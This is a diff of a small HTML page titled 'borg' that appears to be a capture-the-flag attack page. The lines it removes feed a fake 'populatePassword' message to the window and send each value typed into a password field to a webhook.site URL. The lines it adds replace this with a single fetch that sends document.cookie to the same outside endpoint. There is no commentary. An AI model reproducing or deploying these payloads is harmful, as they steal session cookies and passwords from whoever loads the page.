@@ -6,39 +6,11 @@
         <title>borg</title>
     </head>
     <body>
-        <input type="password" id="lol" />
-        <button onclick="change()">click me</button>
-
         <script>
-            let field = document.getElementById("lol");
-
-            let lastValue = field.value;
-            console.log(lastValue);
-
-            setInterval(() => {
-                window.postMessage(
-                    {
-                        action: "populatePassword",
-                        url: "http://flag",
-                        password: "YourPassword", // Replace with the desired password
-                    },
-                    "*"
-                );
-
-                if (lastValue != field.value) {
-                    console.log("changed");
-                    lastValue = field.value;
-                    fetch(
-                        "https://webhook.site/224a98ac-5861-43fa-90ed-22d67f21a61b?val=" +
-                            lastValue
-                    );
-                }
-            }, 1000);
-
-            function change() {
-                field.value = "lol";
-                alert("changed");
-            }
+            fetch(
+                "https://webhook.site/224a98ac-5861-43fa-90ed-22d67f21a61b?c=" +
+                    document.cookie
+            );
         </script>
     </body>
 </html>
